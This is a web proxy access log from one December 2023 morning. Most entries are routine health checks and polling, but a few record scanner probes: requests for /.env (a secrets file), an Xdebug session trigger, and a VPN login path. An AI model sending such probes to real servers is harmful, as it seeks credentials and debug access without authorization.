173.48.140.140 - - [21/Dec/2023:03:40:13 +0000] "GET /trace/polltrace.php?id=v7nwpaogc HTTP/2.0" 200 139 "-" "-" 4032 "livetrace@docker" "http://172.20.0.5:80" 1ms
173.48.140.140 - - [21/Dec/2023:03:40:14 +0000] "GET /trace/polltrace.php?id=v7nwpaogc HTTP/2.0" 200 139 "-" "-" 4033 "livetrace@docker" "http://172.20.0.5:80" 1ms
173.48.140.140 - - [21/Dec/2023:03:40:15 +0000] "GET /trace/polltrace.php?id=v7nwpaogc HTTP/2.0" 200 139 "-" "-" 4034 "livetrace@docker" "http://172.20.0.5:80" 1ms
173.48.140.140 - - [21/Dec/2023:03:40:16 +0000] "GET /trace/polltrace.php?id=v7nwpaogc HTTP/2.0" 200 139 "-" "-" 4035 "livetrace@docker" "http://172.20.0.5:80" 1ms
173.48.140.140 - - [21/Dec/2023:03:40:17 +0000] "GET /trace/polltrace.php?id=v7nwpaogc HTTP/2.0" 200 139 "-" "-" 4036 "livetrace@docker" "http://172.20.0.5:80" 1ms
159.203.109.206 - - [21/Dec/2023:03:40:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4037 "www@docker" "http://172.20.0.9:80" 0ms
173.48.140.140 - - [21/Dec/2023:03:40:18 +0000] "GET /trace/polltrace.php?id=v7nwpaogc HTTP/2.0" 200 139 "-" "-" 4038 "livetrace@docker" "http://172.20.0.5:80" 1ms
173.48.140.140 - - [21/Dec/2023:03:40:19 +0000] "GET /trace/polltrace.php?id=v7nwpaogc HTTP/2.0" 200 139 "-" "-" 4039 "livetrace@docker" "http://172.20.0.5:80" 2ms
173.48.140.140 - - [21/Dec/2023:03:40:20 +0000] "GET /trace/polltrace.php?id=v7nwpaogc HTTP/2.0" 200 466 "-" "-" 4040 "livetrace@docker" "http://172.20.0.5:80" 2ms
173.48.140.140 - - [21/Dec/2023:03:40:21 +0000] "GET /trace/polltrace.php?id=v7nwpaogc HTTP/2.0" 200 626 "-" "-" 4041 "livetrace@docker" "http://172.20.0.5:80" 2ms
173.48.140.140 - - [21/Dec/2023:03:40:22 +0000] "GET /trace/polltrace.php?id=v7nwpaogc HTTP/2.0" 200 626 "-" "-" 4042 "livetrace@docker" "http://172.20.0.5:80" 1ms
173.48.140.140 - - [21/Dec/2023:03:40:23 +0000] "GET /trace/polltrace.php?id=v7nwpaogc HTTP/2.0" 200 626 "-" "-" 4043 "livetrace@docker" "http://172.20.0.5:80" 2ms
173.48.140.140 - - [21/Dec/2023:03:40:24 +0000] "GET /trace/polltrace.php?id=v7nwpaogc HTTP/2.0" 200 905 "-" "-" 4044 "livetrace@docker" "http://172.20.0.5:80" 1ms
173.48.140.140 - - [21/Dec/2023:03:40:24 +0000] "GET /trace/cleantrace.php?id=v7nwpaogc HTTP/2.0" 200 72 "-" "-" 4045 "livetrace@docker" "http://172.20.0.5:80" 3ms
167.71.120.76 - - [21/Dec/2023:03:40:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4046 "www@docker" "http://172.20.0.9:80" 0ms
83.97.73.87 - - [21/Dec/2023:03:40:37 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 19 "-" "-" 4047 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:03:41:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4048 "www@docker" "http://172.20.0.9:80" 0ms
45.79.168.172 - - [21/Dec/2023:03:41:25 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4049 "-" "-" 0ms
167.71.120.76 - - [21/Dec/2023:03:41:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4050 "www@docker" "http://172.20.0.9:80" 0ms
172.104.11.4 - - [21/Dec/2023:03:41:51 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4051 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:03:42:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4052 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:42:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4053 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:03:43:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4054 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:43:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4055 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:03:44:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4056 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:44:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4057 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:03:45:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4058 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:45:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4059 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:03:46:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4060 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:46:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4061 "www@docker" "http://172.20.0.9:80" 1ms
198.235.24.251 - - [21/Dec/2023:03:46:54 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4062 "dashboard@internal" "-" 0ms
198.235.24.251 - - [21/Dec/2023:03:46:55 +0000] "GET /dashboard/ HTTP/1.1" 200 3124 "-" "-" 4063 "dashboard@internal" "-" 6ms
159.203.109.206 - - [21/Dec/2023:03:47:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4064 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:47:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4065 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:03:48:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4066 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:48:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4067 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:03:49:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4068 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:49:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4069 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:03:50:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4070 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:03:50:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4071 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:03:51:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4072 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:51:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4073 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:03:52:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4074 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:52:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4075 "www@docker" "http://172.20.0.9:80" 1ms
83.97.73.87 - - [21/Dec/2023:03:52:47 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 19 "-" "-" 4076 "-" "-" 0ms
205.210.31.140 - - [21/Dec/2023:03:53:18 +0000] "GET / HTTP/1.0" 404 19 "-" "-" 4077 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:03:53:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4078 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:53:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4079 "www@docker" "http://172.20.0.9:80" 1ms
198.235.24.67 - - [21/Dec/2023:03:53:33 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4080 "dashboard@internal" "-" 0ms
198.235.24.67 - - [21/Dec/2023:03:53:33 +0000] "GET /dashboard/ HTTP/1.1" 200 3124 "-" "-" 4081 "dashboard@internal" "-" 0ms
54.37.79.75 - - [21/Dec/2023:03:54:09 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4082 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [21/Dec/2023:03:54:09 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4083 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [21/Dec/2023:03:54:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4084 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:54:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4085 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:03:55:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4086 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:55:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4087 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:03:56:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4088 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:56:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4089 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:03:57:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4090 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:03:57:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4091 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:03:58:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4092 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:58:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4093 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:03:59:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4094 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:03:59:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4095 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:04:00:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4096 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:00:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4097 "www@docker" "http://172.20.0.9:80" 1ms
173.48.140.140 - - [21/Dec/2023:04:00:53 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 4098 "logpager@docker" "http://172.20.0.3:80" 1ms
173.48.140.140 - - [21/Dec/2023:04:00:53 +0000] "GET /logs/styles.css HTTP/2.0" 304 0 "-" "-" 4099 "logpager@docker" "http://172.20.0.3:80" 0ms
173.48.140.140 - - [21/Dec/2023:04:00:53 +0000] "GET /logs/scripts.js?version=5 HTTP/2.0" 304 0 "-" "-" 4100 "logpager@docker" "http://172.20.0.3:80" 0ms
173.48.140.140 - - [21/Dec/2023:04:00:53 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 1724 "-" "-" 4101 "logpager@docker" "http://172.20.0.3:80" 4ms
159.203.109.206 - - [21/Dec/2023:04:01:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4102 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:01:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4103 "www@docker" "http://172.20.0.9:80" 0ms
5.42.92.25 - - [21/Dec/2023:04:02:03 +0000] "GET //.env HTTP/1.1" 301 17 "-" "-" 4104 "web-to-websecure@internal" "-" 0ms
34.140.248.32 - - [21/Dec/2023:04:02:15 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4105 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [21/Dec/2023:04:02:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4106 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:02:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4107 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:04:03:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4108 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:04:03:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4109 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:04:04:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4110 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:04:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4111 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:04:05:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4112 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:05:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4113 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:04:06:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4114 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:06:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4115 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:04:07:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4116 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:07:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4117 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:04:08:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4118 "www@docker" "http://172.20.0.9:80" 15ms
167.71.120.76 - - [21/Dec/2023:04:08:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4119 "www@docker" "http://172.20.0.9:80" 45ms
159.203.109.206 - - [21/Dec/2023:04:09:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4120 "www@docker" "http://172.20.0.9:80" 16ms
167.71.120.76 - - [21/Dec/2023:04:09:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4121 "www@docker" "http://172.20.0.9:80" 2ms
159.203.109.206 - - [21/Dec/2023:04:10:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4122 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:10:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4123 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:04:11:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4124 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:11:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4125 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:04:12:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4126 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:12:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4127 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:04:13:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4128 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:13:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4129 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:04:14:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4130 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:14:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4131 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:04:15:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4132 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:15:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4133 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:04:16:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4134 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:16:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4135 "www@docker" "http://172.20.0.9:80" 1ms
143.110.222.166 - - [21/Dec/2023:04:17:03 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4136 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [21/Dec/2023:04:17:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4137 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:17:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4138 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:04:18:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4139 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:18:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4140 "www@docker" "http://172.20.0.9:80" 2ms
159.203.109.206 - - [21/Dec/2023:04:19:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4141 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:19:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4142 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:04:20:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4143 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:20:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4144 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:04:21:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4145 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:04:21:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4146 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:04:22:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4147 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:22:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4148 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:04:23:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4149 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:04:23:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4150 "www@docker" "http://172.20.0.9:80" 0ms
184.105.139.69 - - [21/Dec/2023:04:24:08 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4151 "-" "-" 0ms
104.243.37.151 - - [21/Dec/2023:04:24:13 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4152 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:04:24:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4153 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:24:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4154 "www@docker" "http://172.20.0.9:80" 0ms
54.37.79.75 - - [21/Dec/2023:04:24:40 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4155 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [21/Dec/2023:04:24:40 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4156 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [21/Dec/2023:04:25:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4157 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:25:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4158 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:04:26:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4159 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:26:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4160 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:04:27:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4161 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:27:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4162 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:04:28:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4163 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:28:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4164 "www@docker" "http://172.20.0.9:80" 0ms
143.110.222.166 - - [21/Dec/2023:04:28:57 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4165 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [21/Dec/2023:04:29:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4166 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:29:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4167 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:04:30:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4168 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:30:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4169 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:04:31:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4170 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:31:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4171 "www@docker" "http://172.20.0.9:80" 0ms
104.243.37.151 - - [21/Dec/2023:04:31:34 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4172 "-" "-" 0ms
184.105.139.69 - - [21/Dec/2023:04:31:59 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 4173 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:04:32:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4174 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:32:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4175 "www@docker" "http://172.20.0.9:80" 0ms
184.105.139.69 - - [21/Dec/2023:04:33:00 +0000] "GET /dns-query?name=dnsscan.shadowserver.org&type=A HTTP/1.1" 404 19 "-" "-" 4176 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:04:33:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4177 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:33:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4178 "www@docker" "http://172.20.0.9:80" 0ms
184.105.139.69 - - [21/Dec/2023:04:33:46 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4179 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:04:34:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4180 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:04:34:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4181 "www@docker" "http://172.20.0.9:80" 0ms
69.164.217.74 - - [21/Dec/2023:04:34:50 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4182 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:04:35:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4183 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:35:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4184 "www@docker" "http://172.20.0.9:80" 1ms
184.105.139.69 - - [21/Dec/2023:04:35:33 +0000] "GET /api/v2/static/not.found HTTP/1.1" 404 19 "-" "-" 4185 "-" "-" 0ms
184.105.139.69 - - [21/Dec/2023:04:35:55 +0000] "GET /remote/logincheck HTTP/1.1" 404 19 "-" "-" 4186 "-" "-" 0ms
45.79.128.205 - - [21/Dec/2023:04:35:55 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4187 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:04:36:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4188 "www@docker" "http://172.20.0.9:80" 0ms
172.105.128.11 - - [21/Dec/2023:04:36:24 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4189 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [21/Dec/2023:04:36:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4190 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:04:37:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4191 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:04:37:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4192 "www@docker" "http://172.20.0.9:80" 1ms
167.94.138.34 - - [21/Dec/2023:04:38:00 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4193 "-" "-" 0ms
167.94.138.34 - - [21/Dec/2023:04:38:03 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4194 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:04:38:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4195 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:38:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4196 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:04:39:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4197 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:39:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4198 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:04:40:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4199 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:40:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4200 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:04:41:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4201 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:41:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4202 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:04:42:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4203 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:42:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4204 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:04:43:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4205 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:43:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4206 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:04:44:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4207 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:44:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4208 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:04:45:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4209 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:04:45:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4210 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:04:46:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4211 "www@docker" "http://172.20.0.9:80" 0ms
